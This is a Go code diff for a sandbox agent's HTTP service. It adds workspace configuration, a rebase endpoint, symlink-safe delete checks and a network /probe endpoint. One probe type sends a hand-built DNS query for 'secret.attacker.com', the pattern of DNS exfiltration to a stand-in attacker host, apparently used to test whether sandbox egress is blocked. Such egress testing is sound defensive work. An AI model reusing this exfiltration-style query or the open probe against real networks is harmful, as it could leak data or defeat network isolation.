@@ -16,6 +16,7 @@ import (
 	"log"
 	"mime"
 	"mime/multipart"
+	"net"
 	"net/http"
 	"os"
 	"os/exec"
@@ -29,8 +30,6 @@ import (
 
 const (
 	workspaceDir       = "/workspace"
-	baseSHAFile        = workspaceDir + "/.bvm_base_sha"
-	gitExcludeFile     = workspaceDir + "/.git/info/exclude"
 	baseSHAExclude     = "/.bvm_base_sha"
 	maxSyncBytes       = 2 << 30
 	maxJSONBytes       = 1 << 20
@@ -40,6 +39,9 @@ const (
 	execWaitDelay      = 2 * time.Second
 	startFailExitCode  = 127
 	timeoutExitCode    = 124
+	defaultProbeMs     = 3000
+	minProbeMs         = 100
+	maxProbeMs         = 15000
 )
 
 var gitEnv = []string{
@@ -57,12 +59,22 @@ func (a *agent) routes() http.Handler {
 	mux.HandleFunc("GET /health", a.handleHealth)
 	mux.HandleFunc("GET /entropy", handleEntropy)
 	mux.HandleFunc("POST /sync", a.handleSync)
+	mux.HandleFunc("POST /rebase", a.handleRebase)
+	mux.HandleFunc("POST /services/start", a.handleStartServices)
+	mux.HandleFunc("POST /probe", a.handleProbe)
 	mux.HandleFunc("POST /exec", a.handleExec)
 	mux.HandleFunc("GET /diff", a.handleDiff)
 	mux.HandleFunc("POST /checkpoint", a.handleCheckpoint)
 	mux.HandleFunc("POST /pty", a.handlePTY)
 	mux.HandleFunc("POST /tcp", a.handleTCP)
 	return mux
+}
+
+func (a *agent) workspace() string {
+	if a.wsDir != "" {
+		return a.wsDir
+	}
+	return workspaceDir
 }
 
 func writeJSON(w http.ResponseWriter, status int, v any) {
@@ -82,8 +94,10 @@ func (a *agent) handleHealth(w http.ResponseWriter, _ *http.Request) {
 	writeJSON(w, http.StatusOK, types.HealthResponse{
 		OK:            !a.degraded.Load(),
 		PgReady:       a.pgReady.Load(),
+		PresetsReady:  a.presetsReady.Load(),
 		ServicesReady: a.servicesReady.Load(),
 		Services:      a.serviceSnapshot(),
+		Version:       execdVersion,
 		UptimeSec:     int64(time.Since(a.start).Seconds()),
 		Hostname:      host,
 	})
@@ -117,12 +131,13 @@ func handleEntropy(w http.ResponseWriter, _ *http.Request) {
 func (a *agent) handleSync(w http.ResponseWriter, r *http.Request) {
 	a.wsMu.Lock()
 	defer a.wsMu.Unlock()
-	if err := os.MkdirAll(workspaceDir, 0o755); err != nil {
+	ws := a.workspace()
+	if err := os.MkdirAll(ws, 0o755); err != nil {
 		httpError(w, http.StatusInternalServerError, fmt.Errorf("create workspace: %w", err))
 		return
 	}
 	body := http.MaxBytesReader(w, r.Body, maxSyncBytes)
-	if err := a.applySyncRequest(r.Header.Get("Content-Type"), body, workspaceDir); err != nil {
+	if err := a.applySyncRequest(r.Header.Get("Content-Type"), body, ws); err != nil {
 		httpError(w, http.StatusBadRequest, err)
 		return
 	}
@@ -132,6 +147,95 @@ func (a *agent) handleSync(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 	writeJSON(w, http.StatusOK, syncResponse{OK: true, BaseSHA: sha})
+}
+
+func (a *agent) handleRebase(w http.ResponseWriter, _ *http.Request) {
+	a.wsMu.Lock()
+	defer a.wsMu.Unlock()
+	sha, err := a.commitBase()
+	if err != nil {
+		httpError(w, http.StatusInternalServerError, err)
+		return
+	}
+	writeJSON(w, http.StatusOK, syncResponse{OK: true, BaseSHA: sha})
+}
+
+func (a *agent) handleProbe(w http.ResponseWriter, r *http.Request) {
+	var req types.ProbeRequest
+	if err := json.NewDecoder(http.MaxBytesReader(w, r.Body, maxJSONBytes)).Decode(&req); err != nil {
+		httpError(w, http.StatusBadRequest, fmt.Errorf("decode probe request: %w", err))
+		return
+	}
+	timeoutMs := req.TimeoutMs
+	if timeoutMs <= 0 {
+		timeoutMs = defaultProbeMs
+	} else if timeoutMs < minProbeMs {
+		timeoutMs = minProbeMs
+	} else if timeoutMs > maxProbeMs {
+		timeoutMs = maxProbeMs
+	}
+	timeout := time.Duration(timeoutMs) * time.Millisecond
+
+	switch req.Kind {
+	case "tcp":
+		c, err := net.DialTimeout("tcp", req.Addr, timeout)
+		if err != nil {
+			writeJSON(w, http.StatusOK, types.ProbeResponse{OK: false, Error: err.Error()})
+			return
+		}
+		_ = c.Close()
+		writeJSON(w, http.StatusOK, types.ProbeResponse{OK: true})
+	case "udp-dns":
+		// Minimal RFC 1035 DNS A query for secret.attacker.com (ID 0x1234, RD=1).
+		query := []byte{
+			0x12, 0x34, 0x01, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+			6, 's', 'e', 'c', 'r', 'e', 't',
+			8, 'a', 't', 't', 'a', 'c', 'k', 'e', 'r',
+			3, 'c', 'o', 'm', 0,
+			0x00, 0x01, 0x00, 0x01,
+		}
+		c, err := net.DialTimeout("udp", req.Addr, timeout)
+		if err != nil {
+			writeJSON(w, http.StatusOK, types.ProbeResponse{OK: false, Error: err.Error()})
+			return
+		}
+		defer c.Close()
+		_ = c.SetDeadline(time.Now().Add(timeout))
+		if _, err := c.Write(query); err != nil {
+			writeJSON(w, http.StatusOK, types.ProbeResponse{OK: false, Error: err.Error()})
+			return
+		}
+		var buf [512]byte
+		n, err := c.Read(buf[:])
+		if err != nil {
+			writeJSON(w, http.StatusOK, types.ProbeResponse{OK: false, Error: err.Error()})
+			return
+		}
+		if n == 0 {
+			writeJSON(w, http.StatusOK, types.ProbeResponse{OK: false, Error: "empty dns reply"})
+			return
+		}
+		writeJSON(w, http.StatusOK, types.ProbeResponse{OK: true})
+	case "http":
+		client := &http.Client{Timeout: timeout}
+		httpReq, err := http.NewRequestWithContext(r.Context(), http.MethodGet, req.URL, nil)
+		if err != nil {
+			writeJSON(w, http.StatusOK, types.ProbeResponse{OK: false, Error: err.Error()})
+			return
+		}
+		if req.HeaderKey != "" && req.HeaderVal != "" {
+			httpReq.Header.Set(req.HeaderKey, req.HeaderVal)
+		}
+		resp, err := client.Do(httpReq)
+		if err != nil {
+			writeJSON(w, http.StatusOK, types.ProbeResponse{OK: false, Error: err.Error()})
+			return
+		}
+		_ = resp.Body.Close()
+		writeJSON(w, http.StatusOK, types.ProbeResponse{OK: true, StatusCode: resp.StatusCode})
+	default:
+		httpError(w, http.StatusBadRequest, fmt.Errorf("unknown probe kind %q", req.Kind))
+	}
 }
 
 func (a *agent) applySyncRequest(contentType string, body io.Reader, root string) error {
@@ -287,7 +391,36 @@ func safeDeleteTarget(root, rel string) (string, error) {
 	if clean == ".git" || strings.HasPrefix(clean, ".git/") || clean == ".bvm_base_sha" {
 		return "", fmt.Errorf("refusing to delete protected path %q", rel)
 	}
-	return safeJoin(root, clean)
+	target, err := safeJoin(root, clean)
+	if err != nil {
+		return "", err
+	}
+	cleanRoot := filepath.Clean(root)
+	relDir, err := filepath.Rel(cleanRoot, filepath.Dir(target))
+	if err != nil {
+		return "", fmt.Errorf("resolve delete parent %q: %w", rel, err)
+	}
+	cur := cleanRoot
+	for _, part := range strings.Split(relDir, string(os.PathSeparator)) {
+		if part == "" || part == "." {
+			continue
+		}
+		cur = filepath.Join(cur, part)
+		fi, err := os.Lstat(cur)
+		if err != nil {
+			if errors.Is(err, fs.ErrNotExist) {
+				break
+			}
+			return "", fmt.Errorf("lstat %s: %w", cur, err)
+		}
+		if fi.Mode()&os.ModeSymlink != 0 {
+			return "", fmt.Errorf("delete path %q traverses symlink %s", rel, cur)
+		}
+		if !fi.IsDir() {
+			return "", fmt.Errorf("delete path %q has non-directory parent %s", rel, cur)
+		}
+	}
+	return target, nil
 }
 
 func pruneEmptyParents(dir, stopRoot string) {
@@ -309,12 +442,13 @@ func pruneEmptyParents(dir, stopRoot string) {
 }
 
 func (a *agent) commitBase() (string, error) {
-	if _, err := os.Stat(filepath.Join(workspaceDir, ".git")); errors.Is(err, fs.ErrNotExist) {
+	ws := a.workspace()
+	if _, err := os.Stat(filepath.Join(ws, ".git")); errors.Is(err, fs.ErrNotExist) {
 		if _, err := a.git("-c", "init.defaultBranch=main", "init", "-q"); err != nil {
 			return "", err
 		}
 	}
-	if err := excludeBaseSHAFile(); err != nil {
+	if err := excludeBaseSHAFile(ws); err != nil {
 		return "", err
 	}
 	if _, err := a.git("add", "-A"); err != nil {
@@ -328,16 +462,18 @@ func (a *agent) commitBase() (string, error) {
 		return "", err
 	}
 	sha := strings.TrimSpace(out)
-	if err := os.WriteFile(baseSHAFile, []byte(sha+"\n"), 0o644); err != nil {
-		return "", fmt.Errorf("write %s: %w", baseSHAFile, err)
+	shaFile := filepath.Join(ws, ".bvm_base_sha")
+	if err := os.WriteFile(shaFile, []byte(sha+"\n"), 0o644); err != nil {
+		return "", fmt.Errorf("write %s: %w", shaFile, err)
 	}
 	a.baseSHA = sha
 	return sha, nil
 }
 
 // The base sha file lives in the workspace, so it must never show up in /diff.
-func excludeBaseSHAFile() error {
-	data, err := os.ReadFile(gitExcludeFile)
+func excludeBaseSHAFile(ws string) error {
+	excludeFile := filepath.Join(ws, ".git", "info", "exclude")
+	data, err := os.ReadFile(excludeFile)
 	if err != nil && !errors.Is(err, fs.ErrNotExist) {
 		return fmt.Errorf("read git exclude: %w", err)
 	}
@@ -346,10 +482,10 @@ func excludeBaseSHAFile() error {
 			return nil
 		}
 	}
-	if err := os.MkdirAll(filepath.Dir(gitExcludeFile), 0o755); err != nil {
+	if err := os.MkdirAll(filepath.Dir(excludeFile), 0o755); err != nil {
 		return fmt.Errorf("create git info dir: %w", err)
 	}
-	f, err := os.OpenFile(gitExcludeFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0o644)
+	f, err := os.OpenFile(excludeFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0o644)
 	if err != nil {
 		return fmt.Errorf("open git exclude: %w", err)
 	}
@@ -365,7 +501,7 @@ func (a *agent) handleDiff(w http.ResponseWriter, _ *http.Request) {
 	defer a.wsMu.Unlock()
 	base := a.baseSHA
 	if base == "" {
-		if data, err := os.ReadFile(baseSHAFile); err == nil {
+		if data, err := os.ReadFile(filepath.Join(a.workspace(), ".bvm_base_sha")); err == nil {
 			base = strings.TrimSpace(string(data))
 		}
 	}
@@ -389,7 +525,7 @@ func (a *agent) handleDiff(w http.ResponseWriter, _ *http.Request) {
 }
 
 func (a *agent) git(args ...string) (string, error) {
-	return gitInDir(a.procs, a.mergeEnv(gitEnv), workspaceDir, args...)
+	return gitInDir(a.procs, a.mergeEnv(gitEnv), a.workspace(), args...)
 }
 
 func gitInDir(procs *procTable, env []string, dir string, args ...string) (string, error) {
@@ -427,7 +563,7 @@ func (a *agent) runExec(parent context.Context, req types.ExecRequest) types.Exe
 
 	dir := req.Dir
 	if dir == "" {
-		dir = workspaceDir
+		dir = a.workspace()
 	}
 	cmd := exec.CommandContext(ctx, req.Cmd[0], req.Cmd[1:]...)
 	cmd.Dir = dir
